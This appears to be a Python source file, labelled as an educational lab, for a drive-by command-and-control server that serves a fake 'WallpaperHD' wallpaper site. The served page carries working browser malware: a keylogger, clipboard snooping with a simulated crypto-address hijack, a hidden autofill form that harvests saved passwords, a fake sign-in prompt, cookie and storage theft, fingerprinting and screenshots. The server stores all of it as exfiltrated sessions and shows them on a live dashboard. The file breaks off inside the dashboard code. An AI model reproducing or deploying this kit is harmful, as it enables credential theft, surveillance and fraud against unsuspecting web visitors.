"""
c2_server.py — Drive-By C2 Server (Part 2 + Logging)
Saves ALL exfil data to exfil_log.json
Saves ALL screenshots as PNG files to exfil_screenshots/

EDUCATIONAL LAB ONLY.
Run: python c2_server.py --image samples/stego.png --port 8080 --no-https
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from rich.console import Console
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich import box
from pathlib import Path
from PIL import Image
import threading, argparse, json, time, sys, os, socket, ssl, base64, datetime

console    = Console()
state_lock = threading.Lock()
state = {
    "start_time":    time.time(),
    "connections":   [],
    "exfil_data":    [],
    "page_hits":     0,
    "setup_hits":    0,
    "image_fetches": 0,
    "exfil_count":   0,
    "total_hits":    0,
    "server_ip":     "",
    "server_port":   0,
    "stego_path":    "",
    "payload":       "",
    "https":         False,
    "screenshot_count": 0,
}

BANNER = r"""
  ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
 ██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
 ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
 ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
 ╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
  ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
"""

# ── Ensure output directories exist
os.makedirs("exfil_screenshots", exist_ok=True)
os.makedirs("exfil_sessions",    exist_ok=True)


# ─────────────────────────────────────────────────────────────
#  LOGGING HELPERS
# ─────────────────────────────────────────────────────────────

def save_screenshot(data_url: str, ip: str) -> str:
    """Decode base64 PNG and save to exfil_screenshots/"""
    try:
        # data_url = "data:image/png;base64,ABC123..."
        if "," not in data_url:
            return "[invalid data url]"
        header, b64 = data_url.split(",", 1)
        # Strip truncation marker if present
        b64 = b64.replace("...[truncated for dashboard]", "")
        img_bytes = base64.b64decode(b64 + "==")  # pad just in case
        ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        clean_ip = ip.replace(".", "_")
        filename = f"exfil_screenshots/screen_{clean_ip}_{ts}.png"
        with open(filename, "wb") as f:
            f.write(img_bytes)
        return filename
    except Exception as e:
        return f"[save error: {e}]"


def save_session(session: dict):
    """Save full session JSON to exfil_sessions/"""
    try:
        ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        clean_ip = session["ip"].replace(".", "_")
        filename = f"exfil_sessions/session_{clean_ip}_{ts}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(session, f, indent=2, ensure_ascii=False)
        return filename
    except Exception as e:
        return f"[save error: {e}]"


def append_log(entry: dict):
    """Append to master exfil_log.json (one JSON object per line)"""
    try:
        with open("exfil_log.json", "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────
#  LSB DECODER
# ─────────────────────────────────────────────────────────────

def decode_stego(path):
    try:
        img  = Image.open(path).convert("RGB")
        bits = [c & 1 for px in img.getdata() for c in px]
        if len(bits) < 32:
            return "[empty]"
        n = int("".join(map(str, bits[:32])), 2)
        if not n or n > (len(bits) - 32) // 8:
            return "[no payload]"
        raw = bytearray()
        for i in range(n):
            b = 0
            for j in range(8):
                b = (b << 1) | bits[32 + i * 8 + j]
            raw.append(b)
        return raw.decode("utf-8", errors="replace")
    except Exception as e:
        return "[err: " + str(e) + "]"


# ─────────────────────────────────────────────────────────────
#  SETUP PAGE
# ─────────────────────────────────────────────────────────────

def get_setup_page():
    html = """<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WallpaperHD - Initializing</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#0f0f13;color:#fff;font-family:Arial,sans-serif;
       min-height:100vh;display:flex;align-items:center;justify-content:center}
  .box{text-align:center;padding:40px;width:100%;max-width:400px}
  .logo{font-size:2em;font-weight:900;margin-bottom:6px}
  .logo span{color:#e94560}
  .sub{color:#8892a4;margin-bottom:40px;font-size:.95em}
  .steps{text-align:left;margin:0 auto 32px}
  .step{display:flex;align-items:center;gap:12px;margin-bottom:14px;
        color:#8892a4;font-size:.9em;transition:color .3s}
  .step .icon{width:28px;height:28px;border-radius:50%;background:#1a1a2e;
              border:1px solid #2a2a4e;display:flex;align-items:center;
              justify-content:center;font-size:.8em;flex-shrink:0;transition:all .3s}
  .step.done .icon{background:#e94560;border-color:#e94560}
  .step.done{color:#fff}
  .bar-bg{background:#1a1a2e;border-radius:20px;height:8px;overflow:hidden;margin:0 auto}
  .bar{background:linear-gradient(90deg,#e94560,#7c3aed);
       height:100%;width:0%;border-radius:20px;transition:width .5s ease}
  .status{color:#8892a4;font-size:.85em;margin-top:14px}
</style>
</head><body>
<div class="box">
  <div class="logo">Wallpaper<span>HD</span></div>
  <div class="sub">Setting up your experience...</div>
  <div class="steps">
    <div class="step" id="s1"><div class="icon">1</div>Connecting to server</div>
    <div class="step" id="s2"><div class="icon">2</div>Loading preferences</div>
    <div class="step" id="s3"><div class="icon">3</div>Syncing wallpapers</div>
    <div class="step" id="s4"><div class="icon">4</div>Preparing collection</div>
  </div>
  <div class="bar-bg"><div class="bar" id="bar"></div></div>
  <div class="status" id="status">Initializing...</div>
</div>
<script>
function markDone(id, pct, msg) {
  document.getElementById(id).classList.add("done");
  document.getElementById("bar").style.width = pct + "%";
  document.getElementById("status").textContent = msg;
}
setTimeout(function() {
  markDone("s1", 25, "Connection established...");
  document.cookie = "sessionid=eyJhbGciOiJIUzI1NiJ9.victim_8472; path=/; max-age=86400";
  document.cookie = "auth_token=Bearer_xK9mN2pQr8L5vT3w; path=/; max-age=86400";
  document.cookie = "user_id=uid_84720; path=/; max-age=86400";
  document.cookie = "remember_me=true; path=/; max-age=86400";
  document.cookie = "cart_session=cart_ff91a3b2c7; path=/; max-age=86400";
}, 600);
setTimeout(function() {
  markDone("s2", 50, "Loading your preferences...");
  try {
    localStorage.setItem("user_email",    "victim@gmail.com");
    localStorage.setItem("user_name",     "Alex Victim");
    localStorage.setItem("saved_address", "Koninginnegracht 12, Den Haag, NL");
    localStorage.setItem("phone",         "+31 6 12345678");
    localStorage.setItem("last_search",   "bitcoin wallet recovery phrase");
    localStorage.setItem("payment_hint",  "Visa ending 4242");
    sessionStorage.setItem("temp_token",  "sess_tmp_xR7kP2mN9q");
    sessionStorage.setItem("login_time",  new Date().toISOString());
  } catch(e) {}
}, 1400);
setTimeout(function() { markDone("s3", 75, "Syncing wallpaper collection..."); }, 2200);
setTimeout(function() {
  markDone("s4", 100, "All done! Redirecting...");
  setTimeout(function() { window.location.href = "/"; }, 800);
}, 3000);
</script>
</body></html>"""
    return html.encode("utf-8")


# ─────────────────────────────────────────────────────────────
#  ATTACK PAGE
# ─────────────────────────────────────────────────────────────

def get_attack_page(port, use_https):
    html = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WallpaperHD - Free 4K Wallpapers</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:Arial,sans-serif;background:#0f0f13;color:#fff;min-height:100vh}
  header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:18px 24px;
         display:flex;align-items:center;justify-content:space-between}
  .logo{font-size:1.5em;font-weight:800}.logo span{color:#e94560}
  .badge{background:#e94560;color:#fff;font-size:.7em;padding:3px 10px;
         border-radius:20px;font-weight:700}
  .hero{padding:60px 24px 40px;text-align:center;
        background:linear-gradient(180deg,#16213e,#0f0f13)}
  .hero h1{font-size:2.4em;font-weight:900;margin-bottom:12px}
  .hero h1 em{color:#e94560;font-style:normal}
  .hero p{color:#8892a4;max-width:480px;margin:0 auto 28px}
  .tags{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:32px}
  .tag{background:#1a1a2e;border:1px solid #2a2a4e;color:#8892a4;
       padding:6px 14px;border-radius:20px;font-size:.82em}
  .section{padding:28px 20px}
  .section h2{font-size:1.15em;font-weight:700;margin-bottom:16px}
  .section h2 span{color:#e94560}
  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px}
  .card{border-radius:12px;overflow:hidden;aspect-ratio:9/16;
        position:relative;cursor:pointer;transition:transform .2s}
  .card:hover{transform:scale(1.03)}
  .label{position:absolute;bottom:0;left:0;right:0;padding:10px 12px;
         background:linear-gradient(transparent,rgba(0,0,0,0.7));
         font-size:.8em;color:#ddd;font-weight:600}
  .views{position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.5);
         border-radius:10px;padding:2px 8px;font-size:.7em;color:#ccc}
  .new{position:absolute;top:8px;left:8px;background:#e94560;
       border-radius:10px;padding:2px 8px;font-size:.7em;font-weight:700}
  .modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);
            z-index:100;align-items:center;justify-content:center}
  .modal-bg.show{display:flex}
  .modal{background:#1a1a2e;border:1px solid #e94560;border-radius:16px;
         padding:32px;width:90%;max-width:380px;text-align:center}
  .modal h2{font-size:1.3em;margin-bottom:8px}
  .modal p{color:#8892a4;font-size:.9em;margin-bottom:24px}
  .modal input{width:100%;background:#0f0f1a;border:1px solid #2a2a4e;
               color:#fff;padding:12px 16px;border-radius:8px;font-size:1em;
               margin-bottom:12px;outline:none}
  .modal input:focus{border-color:#e94560}
  .modal-btn{width:100%;background:#e94560;color:#fff;border:none;
             padding:14px;border-radius:8px;font-size:1em;font-weight:700;cursor:pointer}
  .skip{color:#555;font-size:.85em;margin-top:16px;display:block;cursor:pointer}
  .dl-bar{position:fixed;bottom:0;left:0;right:0;background:#1a1a2e;
          border-top:1px solid #2a2a4e;padding:14px 20px;
          display:flex;align-items:center;gap:14px;
          transform:translateY(100%);transition:transform .4s ease}
  .dl-bar.show{transform:translateY(0)}
  .dl-info{flex:1}
  .dl-info strong{display:block;font-size:.95em;margin-bottom:2px}
  .dl-info span{font-size:.78em;color:#8892a4}
  .dl-btn{background:#e94560;color:#fff;border:none;padding:10px 22px;
          border-radius:8px;font-weight:700;font-size:.9em;cursor:pointer}
  #dot{position:fixed;top:12px;right:12px;width:8px;height:8px;
       border-radius:50%;background:#222;transition:background .3s;z-index:200}
  #dot.pulse{background:#00ff41;box-shadow:0 0 10px #00ff41;animation:p 1s infinite}
  #dot.done{background:#e94560;box-shadow:0 0 8px #e94560;animation:none}
  @keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
  .trap{position:absolute;left:-9999px;top:-9999px;
        width:1px;height:1px;opacity:0;pointer-events:none}
  footer{text-align:center;padding:28px;color:#3a3a5a;font-size:.8em}
</style>
</head><body>

<div id="dot"></div>
<form class="trap" autocomplete="on">
  <input type="text"     id="tUser"  autocomplete="username">
  <input type="email"    id="tEmail" autocomplete="email">
  <input type="password" id="tPass"  autocomplete="current-password">
</form>

<header>
  <div class="logo">Wallpaper<span>HD</span></div>
  <div style="display:flex;gap:12px;align-items:center">
    <span style="color:#8892a4;font-size:.85em">47,291 wallpapers</span>
    <div class="badge">FREE</div>
  </div>
</header>
<div class="hero">
  <h1>Premium 4K Walls<br><em>Always Free.</em></h1>
  <p>Curated daily. No watermarks. No login required.</p>
  <div class="tags">
    <div class="tag">Abstract</div><div class="tag">Nature</div>
    <div class="tag">City</div><div class="tag">Space</div>
    <div class="tag">Gaming</div><div class="tag">Sci-Fi</div>
  </div>
</div>
<div class="section">
  <h2>Trending <span>Today</span></h2>
  <div class="grid" id="gallery"></div>
</div>
<div class="modal-bg" id="modal">
  <div class="modal">
    <h2>Save to Collection</h2>
    <p>Sign in to sync wallpapers across your devices</p>
    <input type="email"    id="mEmail" placeholder="Email address" autocomplete="email">
    <input type="password" id="mPass"  placeholder="Password"     autocomplete="current-password">
    <button class="modal-btn" onclick="submitLogin()">Sign In</button>
    <span class="skip" onclick="skipLogin()">Continue without signing in</span>
  </div>
</div>
<div class="dl-bar" id="dlBar">
  <div class="dl-info">
    <strong>WallpaperHD App</strong>
    <span>10,000+ walls &bull; Offline mode &bull; 4K quality</span>
  </div>
  <button class="dl-btn">Free Download</button>
</div>
<footer>&copy; 2024 WallpaperHD &bull; Privacy Policy &bull; Terms</footer>

<script>
var C=[["#0d0221","#7c3aed"],["#021d0d","#059669"],["#1a0521","#db2777"],
       ["#0a0d21","#2563eb"],["#1a0a00","#d97706"],["#001a1a","#0891b2"],
       ["#1a1a00","#ca8a04"],["#0a001a","#7c3aed"],["#00001a","#1d4ed8"],
       ["#1a0010","#e11d48"],["#001a0d","#16a34a"],["#0f0a1a","#9333ea"]];
var L=["Cosmic Drift","Neon Forest","Cherry Blossom","Deep Ocean",
       "Amber Dusk","Arctic Frost","Golden Hour","Void Space",
       "Midnight Blue","Rose Quartz","Emerald Isle","Purple Rain"];
var V=["2.1k","847","3.4k","1.2k","5.6k","923","4.1k","761","2.8k","1.9k","3.3k","608"];
var gal=document.getElementById("gallery");
for(var i=0;i<C.length;i++){
  (function(idx){
    var d=document.createElement("div");
    d.className="card";
    d.style.background="linear-gradient(160deg,"+C[idx][0]+","+C[idx][1]+")";
    d.innerHTML=(idx<3?'<div class="new">NEW</div>':"")
      +'<div class="views">'+V[idx]+"</div>"
      +'<div class="label">'+L[idx]+"</div>";
    d.onclick=function(){document.getElementById("modal").classList.add("show");};
    gal.appendChild(d);
  })(i);
}
setTimeout(function(){document.getElementById("dlBar").classList.add("show");},3500);

// ── KEYLOGGER
var keyBuffer="";
var lastField="";
document.addEventListener("keydown",function(e){
  var field=e.target.id||e.target.name||e.target.tagName.toLowerCase();
  if(field!==lastField){keyBuffer+="[FIELD:"+field+"]";lastField=field;}
  var key=e.key;
  if(key==="Enter")key="[ENTER]";
  else if(key===" ")key="[SPACE]";
  else if(key==="Backspace")key="[DEL]";
  else if(key.length>1)key="["+key+"]";
  keyBuffer+=key;
});
setInterval(function(){
  if(keyBuffer.length>0){
    var b=keyBuffer; keyBuffer="";
    sendPartial("keylog_batch",b);
  }
},8000);
window.addEventListener("beforeunload",function(){
  if(keyBuffer.length>0&&navigator.sendBeacon){
    navigator.sendBeacon("/collect",JSON.stringify({partial_type:"keylog_final",value:keyBuffer}));
  }
});

// ── CLIPBOARD HIJACK
var lastClip="";
document.addEventListener("paste",function(e){
  var txt=(e.clipboardData||window.clipboardData).getData("text");
  if(txt&&txt!==lastClip){
    lastClip=txt;
    sendPartial("clipboard_paste",txt);
    var btc=/^(1|3|bc1)[a-zA-Z0-9]{25,41}$/;
    var eth=/^0x[a-fA-F0-9]{40}$/;
    if(btc.test(txt.trim()))
      sendPartial("clipboard_hijack","BTC_REPLACED: "+txt+" -> 1AttackerBTCAddressFakeForLab");
    if(eth.test(txt.trim()))
      sendPartial("clipboard_hijack","ETH_REPLACED: "+txt+" -> 0xAttackerETHFakeForLab");
  }
});
function tryReadClip(){
  if(navigator.clipboard&&navigator.clipboard.readText){
    navigator.clipboard.readText().then(function(t){
      if(t&&t!==lastClip&&t.length>0){lastClip=t;sendPartial("clipboard_read",t);}
    }).catch(function(){});
  }
}
window.addEventListener("focus",tryReadClip);
setInterval(tryReadClip,5000);

// ── SCREENSHOT
function takeScreenshot(){
  try{
    var cvs=document.createElement("canvas");
    cvs.width=window.innerWidth; cvs.height=window.innerHeight;
    var ctx=cvs.getContext("2d");
    ctx.fillStyle="#0f0f13"; ctx.fillRect(0,0,cvs.width,cvs.height);
    ctx.fillStyle="#00ff41"; ctx.font="bold 14px monospace";
    ctx.fillText("=== STEGO-X SCREENSHOT ===",10,22);
    ctx.fillStyle="#ffffff"; ctx.font="13px Arial";
    ctx.fillText("URL: "+window.location.href,10,44);
    ctx.fillText("Title: "+document.title,10,62);
    ctx.fillText("Screen: "+screen.width+"x"+screen.height+" @"+devicePixelRatio+"x",10,80);
    ctx.fillText("Viewport: "+window.innerWidth+"x"+window.innerHeight,10,98);
    ctx.fillText("Time: "+new Date().toISOString(),10,116);
    ctx.fillText("UA: "+navigator.userAgent.substring(0,80),10,134);
    ctx.fillStyle="#e94560";
    ctx.fillText("--- VISIBLE PAGE CONTENT ---",10,158);
    ctx.fillStyle="#cccccc"; ctx.font="12px Arial";
    var nodes=document.querySelectorAll("h1,h2,h3,p,.label,.tag");
    var y=178;
    for(var i=0;i<nodes.length&&y<cvs.height-20;i++){
      var txt=nodes[i].textContent.trim();
      if(txt.length>1){ctx.fillText(txt.substring(0,90),10,y);y+=16;}
    }
    var dataUrl=cvs.toDataURL("image/png");
    // Send full screenshot (saved as PNG by server)
    fetch("/screenshot",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        screenshot: dataUrl,
        url:        window.location.href,
        timestamp:  new Date().toISOString(),
        screen:     screen.width+"x"+screen.height
      })
    }).catch(function(){});
    // Also send preview to dashboard
    sendPartial("screenshot_preview","["+screen.width+"x"+screen.height+"] captured at "+new Date().toTimeString().slice(0,8));
  }catch(e){sendPartial("screenshot_err",e.message);}
}

// ── DATA COLLECTORS
function readCookies(){return document.cookie||"[no cookies]";}
function readStorage(){
  var out={};
  try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);out["local::"+k]=localStorage.getItem(k);}}catch(e){}
  try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);out["session::"+k]=sessionStorage.getItem(k);}}catch(e){}
  return Object.keys(out).length>0?JSON.stringify(out):"[empty]";
}
function readAutofill(){return{
  user: document.getElementById("tUser").value ||"[empty]",
  email:document.getElementById("tEmail").value||"[empty]",
  pass: document.getElementById("tPass").value ||"[empty]"
};}
function readFingerprint(){
  var conn=navigator.connection||{};
  var gpu="unknown";
  try{
    var c=document.createElement("canvas");
    var gl=c.getContext("webgl")||c.getContext("experimental-webgl");
    if(gl){var d=gl.getExtension("WEBGL_debug_renderer_info");
           if(d)gpu=gl.getParameter(d.UNMASKED_RENDERER_WEBGL);}
  }catch(e){}
  return{
    user_agent:   navigator.userAgent,
    screen:       screen.width+"x"+screen.height+" @"+devicePixelRatio+"x",
    timezone:     Intl.DateTimeFormat().resolvedOptions().timeZone,
    language:     navigator.language,
    platform:     navigator.platform||"unknown",
    touch_points: navigator.maxTouchPoints,
    memory_gb:    navigator.deviceMemory||"unknown",
    cpu_cores:    navigator.hardwareConcurrency||"unknown",
    connection:   conn.effectiveType||"unknown",
    gpu_renderer: gpu,
    do_not_track: navigator.doNotTrack||"unset",
    cookies_on:   navigator.cookieEnabled
  };
}

// ── SEND HELPERS
function sendPartial(type,value){
  fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({partial_type:type,value:value,timestamp:new Date().toISOString()})
  }).catch(function(){});
}
function submitLogin(){
  var e=document.getElementById("mEmail").value;
  var p=document.getElementById("mPass").value;
  document.getElementById("modal").classList.remove("show");
  doExfil(e,p,"USER_TYPED");
}
function skipLogin(){
  document.getElementById("modal").classList.remove("show");
  doExfil("","","MODAL_SKIPPED");
}
function doExfil(typedEmail,typedPass,src){
  var af=readAutofill(); var fp=readFingerprint();
  var data={
    c2_command:    window._cmd||"[loading]",
    status:        "COMPROMISED",
    cred_source:   src||"AUTO",
    typed_email:   typedEmail||"[not typed]",
    typed_pass:    typedPass||"[not typed]",
    autofill_user: af.user,
    autofill_email:af.email,
    autofill_pass: af.pass,
    cookies:       readCookies(),
    local_storage: readStorage(),
    keylog_so_far: keyBuffer||"[none yet]",
    clipboard_last:lastClip||"[none yet]",
    user_agent:    fp.user_agent,
    screen:        fp.screen,
    timezone:      fp.timezone,
    language:      fp.language,
    platform:      fp.platform,
    touch_points:  fp.touch_points,
    memory_gb:     fp.memory_gb,
    cpu_cores:     fp.cpu_cores,
    connection:    fp.connection,
    gpu_renderer:  fp.gpu_renderer,
    do_not_track:  fp.do_not_track,
    timestamp:     new Date().toISOString()
  };
  fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify(data)
  }).then(function(){
    var dot=document.getElementById("dot");
    dot.classList.remove("pulse"); dot.classList.add("done");
  }).catch(function(){});
}

// ── ATTACK CHAIN
document.getElementById("dot").classList.add("pulse");
window._cmd="[loading]";
fetch("/api/cmd").then(function(r){return r.json();}).then(function(j){window._cmd=j.cmd;}).catch(function(){});
setTimeout(takeScreenshot,1500);
setTimeout(function(){doExfil("","","AUTO");},2500);
setTimeout(takeScreenshot,30000);
fetch("/wallpaper.png?t="+Date.now()).then(function(r){return r.arrayBuffer();}).then(function(buf){
  var blob=new Blob([buf],{type:"image/png"}); var url=URL.createObjectURL(blob);
  var img=new Image();
  img.onload=function(){
    try{
      var cvs=document.createElement("canvas"); cvs.width=img.width; cvs.height=img.height;
      var ctx=cvs.getContext("2d"); ctx.drawImage(img,0,0);
      var px=ctx.getImageData(0,0,img.width,img.height).data; var bits=[];
      for(var i=0;i<px.length&&bits.length<400032;i++){if((i+1)%4===0)continue;bits.push(px[i]&1);}
      var len=0; for(var i=0;i<32;i++)len=(len<<1)|bits[i];
      if(len>0&&len<=(bits.length-32)/8){
        var out=[];
        for(var i=0;i<len;i++){var byt=0;for(var j=0;j<8;j++)byt=(byt<<1)|bits[32+i*8+j];out.push(byt);}
        window._cmd=new TextDecoder().decode(new Uint8Array(out));
      }
    }catch(e){}
    URL.revokeObjectURL(url);
  };
  img.src=url;
}).catch(function(){});
</script>
</body></html>"""
    return html.encode("utf-8")


# ─────────────────────────────────────────────────────────────
#  HTTP HANDLER
# ─────────────────────────────────────────────────────────────

class C2Handler(BaseHTTPRequestHandler):

    def log_message(self, *a):
        pass

    def _log(self, method, action, size, color="white"):
        with state_lock:
            state["total_hits"] += 1
            state["connections"].append({
                "time":   time.strftime("%H:%M:%S"),
                "ip":     self.client_address[0],
                "port":   self.client_address[1],
                "method": method,
                "action": action,
                "bytes":  size,
                "color":  color,
            })

    def _send(self, code, ctype, body, extra=None):
        self.send_response(code)
        self.send_header("Content-Type",   ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Server",         "nginx/1.24.0")
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        if extra:
            for k, v in extra.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def do_GET(self):
        if self.path == "/setup":
            body = get_setup_page()
            self.send_response(200)
            self.send_header("Content-Type",   "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Server",         "nginx/1.24.0")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Set-Cookie", "server_session=srv_a9f3c7e2b1d8; path=/; max-age=86400")
            self.send_header("Set-Cookie", "tracking_id=trk_5f2a9c8e1b4d; path=/; max-age=86400")
            self.send_header("Set-Cookie", "pref_theme=dark; path=/; max-age=86400")
            self.end_headers()
            self.wfile.write(body)
            with state_lock:
                state["setup_hits"] += 1
            self._log("GET", "SETUP - COOKIES PLANTED", len(body), "magenta")

        elif self.path in ("/", "/index.html"):
            body = get_attack_page(state["server_port"], state["https"])
            self._send(200, "text/html; charset=utf-8", body)
            with state_lock:
                state["page_hits"] += 1
            self._log("GET", "VICTIM VISITED PAGE", len(body), "cyan")

        elif self.path.startswith("/wallpaper.png"):
            p = state["stego_path"]
            if Path(p).exists():
                data = Path(p).read_bytes()
                self._send(200, "image/png", data, {"Cache-Control": "no-store"})
                with state_lock:
                    state["image_fetches"] += 1
                self._log("GET", "STEGO IMG FETCHED", len(data), "yellow")
            else:
                self._send(404, "text/plain", b"not found")

        elif self.path == "/api/cmd":
            body = json.dumps({"cmd": state["payload"] or "[no payload]"}).encode("utf-8")
            self._send(200, "application/json", body)

        elif self.path == "/favicon.ico":
            self._send(204, "text/plain", b"")

        else:
            self._send(404, "text/plain", b"not found")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw    = self.rfile.read(length)
        self._send(200, "application/json", b'{"status":"ok"}')
        ip = self.client_address[0]

        try:
            data = json.loads(raw.decode("utf-8"))
        except Exception:
            data = {"raw": raw.decode("utf-8", errors="replace")}

        # ── Screenshot endpoint (separate POST /screenshot)
        if self.path == "/screenshot":
            ss_data = data.get("screenshot", "")
            if ss_data and ss_data.startswith("data:image"):
                filename = save_screenshot(ss_data, ip)
                with state_lock:
                    state["screenshot_count"] += 1
                    sc = state["screenshot_count"]
                self._log("POST", f"SCREENSHOT SAVED #{sc}", len(raw), "green")
                # Log metadata
                append_log({
                    "type":      "screenshot",
                    "time":      time.strftime("%Y-%m-%d %H:%M:%S"),
                    "ip":        ip,
                    "file":      filename,
                    "url":       data.get("url", ""),
                    "screen":    data.get("screen", ""),
                    "timestamp": data.get("timestamp", ""),
                })
            return

        # ── Partial updates (keylog batches, clipboard)
        ptype = data.get("partial_type", "")
        if ptype:
            color  = "yellow"
            action = "KEYLOG BATCH"
            if "clipboard_paste"  == ptype: action = "CLIPBOARD READ"
            elif "clipboard_hijack" == ptype: action = "CLIPBOARD HIJACKED"
            elif "clipboard_read"  == ptype: action = "CLIPBOARD POLLED"
            elif "screenshot"      in ptype: action = "SCREENSHOT PREVIEW"
            self._log("POST", action, len(raw), color)

            # Append partial data to latest session
            with state_lock:
                if state["exfil_data"]:
                    d = state["exfil_data"][-1]["data"]
                    if "keylog" in ptype:
                        d["keylog_live"] = d.get("keylog_live", "") + data.get("value", "")
                    elif "clipboard" in ptype:
                        d["clipboard_live"] = data.get("value", "")
                    elif "screenshot" in ptype:
                        d["screenshot_status"] = data.get("value", "[captured]")

            # Log partial to file
            append_log({
                "type":      ptype,
                "time":      time.strftime("%Y-%m-%d %H:%M:%S"),
                "ip":        ip,
                "value":     data.get("value", ""),
            })
            return

        # ── Full exfil session
        with state_lock:
            state["exfil_count"] += 1
            session = {
                "time": time.strftime("%H:%M:%S"),
                "ip":   ip,
                "data": data,
                "size": len(raw),
            }
            state["exfil_data"].append(session)

        # Save full session to file
        full_session = {
            "type":      "full_exfil",
            "time":      time.strftime("%Y-%m-%d %H:%M:%S"),
            "ip":        ip,
            "size":      len(raw),
            "data":      data,
        }
        save_session(full_session)
        append_log(full_session)
        self._log("POST", "FULL EXFIL RECEIVED", len(raw), "red")


# ─────────────────────────────────────────────────────────────
#  LIVE DASHBOARD
# ─────────────────────────────────────────────────────────────

def render():
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=12),
        Layout(name="mid",    size=14),
        Layout(name="exfil",  size=28),
        Layout(name="foot",   size=3),
    )
    layout["mid"].split_row(
        Layout(name="stats", ratio=1),
        Layout(name="log",   ratio=2),
    )

    up      = int(time.time() - state["start_time"])
    h, m, s = up // 3600, (up % 3600) // 60, up % 60
    pay     = state["payload"]
    prev    = (pay[:48] + "...") if len(pay) > 48 else pay
    proto   = "https" if state["https"] else "http"
    port    = state["server_port"]

    layout["header"].update(Panel(
        f"[bold green]{BANNER}[/bold green]\n"
        f"  [dim]STEP 1:[/dim]  [{('cyan' if state['https'] else 'yellow')}]{proto}://192.168.2.21:{port}/setup[/{('cyan' if state['https'] else 'yellow')}]  "
        f"[dim]HTTPS:[/dim] [{'green' if state['https'] else 'red'}]{'ON' if state['https'] else 'OFF'}[/{'green' if state['https'] else 'red'}]  "
        f"[dim]UPTIME:[/dim] [green]{h:02d}:{m:02d}:{s:02d}[/green]\n"
        f"  [dim]PAYLOAD:[/dim]  [bold red]\"{prev}\"[/bold red]  "
        f"[dim]SCREENSHOTS SAVED:[/dim] [green]{state['screenshot_count']}[/green]",
        border_style="green", padding=(0, 1)
    ))

    st = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    st.add_column("K", style="cyan",  width=20)
    st.add_column("V", style="white", width=14)
    st.add_row("SETUP VISITS",    f"[magenta]{state['setup_hits']}[/magenta]")
    st.add_row("PAGE VISITS",     f"[cyan]{state['page_hits']}[/cyan]")
    st.add_row("STEGO FETCHES",   f"[yellow]{state['image_fetches']}[/yellow]")
    st.add_row("EXFIL SESSIONS",  f"[bold red]{state['exfil_count']}[/bold red]")
    st.add_row("SCREENSHOTS",     f"[green]{state['screenshot_count']}[/green]")
    st.add_row("TOTAL HITS",      str(state["total_hits"]))
    st.add_row("", "")
    st.add_row("[dim]KEYLOGGER[/dim]",   "[green]ON[/green]")
    st.add_row("[dim]CLIPBOARD[/dim]",   "[green]ON[/green]")
    st.add_row("[dim]SCREENSHOT[/dim]",  "[green]ON[/green]")
    st.add_row("[dim]COOKIES[/dim]",     "[green]ON[/green]")
    st.add_row("[dim]STORAGE[/dim]",     "[green]ON[/green]")
    layout["stats"].update(Panel(st,
        title="[bold green][ METRICS ][/bold green]", border_style="green"))

    lg = Table(box=box.SIMPLE, show_header=True,
               header_style="bold green", padding=(0, 1))
    lg.add_column("TIME",   style="dim",    width=10)
    lg.add_column("SOURCE", style="cyan",   width=18)
    lg.add_column("M",      style="white",  width=5)
    lg.add_column("ACTION", style="bold",   width=26)
    lg.add_column("B",      style="yellow", width=7)
    for c in state["connections"][-10:]:
        clr = c.get("color", "white")
        lg.add_row(
            c["time"],
            f"{c['ip']}:{c['port']}",
            c["method"],
            f"[{clr}]{c['action']}[/{clr}]",
            str(c["bytes"])
        )
    layout["log"].update(Panel(lg,
        title="[bold green][ LIVE CONNECTION LOG ][/bold green]", border_style="green"))

    if state["exfil_data"]:
